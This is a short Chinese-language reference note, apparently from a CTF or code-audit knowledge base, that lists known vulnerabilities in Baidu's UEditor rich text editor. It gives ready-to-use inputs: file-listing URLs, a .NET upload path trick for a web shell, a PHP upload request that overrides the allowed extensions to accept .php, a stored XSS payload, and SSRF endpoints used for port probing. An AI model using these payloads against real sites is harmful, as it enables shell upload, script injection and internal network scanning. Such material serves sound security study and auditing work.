---
title: Ueditor 编辑器漏洞总结
category: code-audit
tags: [ueditor, baidu, file-read, file-upload, ssrf, xss, rce]
triggers: [ueditor, UE, controller.ashx, catchimage, listfile, listimage, CONFIG[imagePathFormat], getRemoteImage, 百度编辑器, 富文本编辑器]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/code-audit/Ueditor 编辑器漏洞总结.md]
---

## Summary

百度 UEditor 富文本编辑器存在文件读取、任意文件上传（.net/.php）、存储型 XSS、SSRF 等多种漏洞。

## Details

### 0x01 文件读取

```
/net/controller.ashx?action=listfile
/net/controller.ashx?action=listimage
```

### 0x02 .net 版本任意文件上传

构造 HTML 表单上传，shell 地址格式为 `http://xxxx/1.gif?.aspx` 绕过解析。

### 0x03 PHP 版本文件上传

```http
POST /ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/fuck&CONFIG[imageAllowFiles][]=.php
```

### 0x04 存储型 XSS

```xml
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
```

### 0x05 SSRF

```
/jsp/controller.jsp?action=catchimage&source[]=
/php/controller.php?action=catchimage&source[]=
```

判断端口是否开放：抓取图片成功返回 `"state":"SUCCESS"`，端口关闭返回 `"抓取远程图片失败"`。

## Connections

- GHSA: [[code-audit/ghsa-rce-patterns]]
- Related: [[web/ghsa-xss-csrf]]
